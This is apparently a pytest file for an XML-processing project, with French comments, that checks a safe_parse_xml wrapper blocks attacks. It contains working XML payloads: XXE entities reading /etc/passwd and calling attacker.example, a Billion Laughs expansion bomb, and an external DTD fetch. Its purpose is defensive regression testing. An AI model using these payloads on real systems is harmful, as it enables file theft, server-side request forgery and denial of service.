"""Sprint S1.4 — Tests d'attaque XXE / Billion Laughs / DTD retrieval.

Vérifie que ``picarones.formats._xml_utils.safe_parse_xml``
**rejette** les payloads malicieux que l'audit prétendait
défendre via ``defusedxml``.

Sans ces tests, la défense est invisible : un refactor pourrait
bypasser ``defusedxml`` sans qu'aucun test n'échoue.

Vecteurs couverts
-----------------
1. **XXE** (XML External Entity) — résolution d'entité vers un
   fichier local ``/etc/passwd`` ou une URL distante.
2. **Billion Laughs** — expansion exponentielle d'entités
   (``lol1`` → ``lol2`` × 10 → ``lol3`` × 100 → ...).
3. **DTD retrieval** — fetch d'une DTD distante (SSRF côté parser).
4. **Quadratic blowup** — grosse entité répétée linéairement.
"""

from __future__ import annotations

from picarones.formats._xml_utils import safe_parse_xml


# ──────────────────────────────────────────────────────────────────────
# 1. XXE — fichier local
# ──────────────────────────────────────────────────────────────────────


class TestXXEFileExfiltration:
    """Une entité externe pointant sur ``/etc/passwd`` doit être
    refusée — sinon le parser retourne le contenu du fichier dans
    le résultat XML."""

    def test_xxe_file_uri_is_blocked(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo ['
            b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
            b']>'
            b'<root>&xxe;</root>'
        )
        result = safe_parse_xml(payload)
        # safe_parse_xml retourne None en cas de détection d'attaque
        # (defusedxml.EntitiesForbidden / DTDForbidden).
        assert result is None, (
            "XXE non bloqué : safe_parse_xml a accepté un payload "
            "avec ``<!ENTITY xxe SYSTEM \"file:///...\">`` ; un "
            "attaquant pourrait exfiltrer ``/etc/passwd`` ou tout "
            "autre fichier lisible par le process."
        )

    def test_xxe_http_uri_is_blocked(self) -> None:
        """Variante : entité externe vers une URL HTTP (SSRF côté
        parser, peut exfiltrer la requête vers un serveur de
        l'attaquant)."""
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo ['
            b'  <!ENTITY xxe SYSTEM "http://attacker.example/leak">'
            b']>'
            b'<root>&xxe;</root>'
        )
        result = safe_parse_xml(payload)
        assert result is None


# ──────────────────────────────────────────────────────────────────────
# 2. Billion Laughs — DoS par expansion d'entités
# ──────────────────────────────────────────────────────────────────────


class TestBillionLaughs:
    """L'attaque historique XML : 10 entités imbriquées → 10^10
    expansion = OOM kill."""

    def test_billion_laughs_is_blocked(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE lolz ['
            b'  <!ENTITY lol "lol">'
            b'  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            b'  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            b'  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
            b'  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
            b']>'
            b'<lolz>&lol5;</lolz>'
        )
        result = safe_parse_xml(payload)
        assert result is None, (
            "Billion Laughs non bloqué : le parser a accepté une "
            "expansion exponentielle d'entités (DoS / OOM)."
        )


# ──────────────────────────────────────────────────────────────────────
# 3. DTD retrieval — DoCTYPE externe
# ──────────────────────────────────────────────────────────────────────


class TestDTDRetrieval:
    """Une DTD externe est un fetch HTTP/HTTPS depuis le parser ;
    c'est une SSRF + fuite d'info."""

    def test_external_dtd_is_blocked(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd">'
            b'<root>data</root>'
        )
        result = safe_parse_xml(payload)
        assert result is None, (
            "DTD retrieval non bloqué : ``<!DOCTYPE root SYSTEM "
            "\"http://...\">`` peut déclencher une requête HTTP "
            "depuis le serveur Picarones (SSRF)."
        )


# ──────────────────────────────────────────────────────────────────────
# 4. Sanity — XML légitime doit passer
# ──────────────────────────────────────────────────────────────────────


class TestLegitimateXMLPasses:
    """Garde-fou : les durcissements ne doivent pas casser un
    document ALTO ou PAGE XML sans entités."""

    def test_simple_alto_xml_parses(self) -> None:
        payload = (
            b'<?xml version="1.0" encoding="UTF-8"?>'
            b'<alto xmlns="http://www.loc.gov/standards/alto/ns-v4#">'
            b'  <Layout>'
            b'    <Page WIDTH="1000" HEIGHT="1500"/>'
            b'  </Layout>'
            b'</alto>'
        )
        result = safe_parse_xml(payload)
        assert result is not None, (
            "ALTO XML légitime refusé — fausse alerte."
        )
        assert result.tag.endswith("alto")

    def test_xml_with_entities_internes_parses(self) -> None:
        """Les entités HTML standards (&amp;, &lt;, &gt;, &quot;,
        &apos;) doivent rester acceptées (resolved par le parser
        sans aller chercher de DTD)."""
        payload = (
            b'<?xml version="1.0"?>'
            b'<root>R&amp;D &lt;tag&gt;</root>'
        )
        result = safe_parse_xml(payload)
        assert result is not None
        assert result.text == "R&D <tag>"


# ──────────────────────────────────────────────────────────────────────
# 5. XML invalide retourne None (pas d'exception qui remonte)
# ──────────────────────────────────────────────────────────────────────


class TestInvalidXMLReturnsNone:
    def test_truncated_xml_returns_none(self) -> None:
        result = safe_parse_xml(b'<root>')
        assert result is None

    def test_empty_bytes_returns_none(self) -> None:
        result = safe_parse_xml(b'')
        assert result is None

    def test_non_xml_bytes_returns_none(self) -> None:
        result = safe_parse_xml(b'not xml at all just text')
        assert result is None
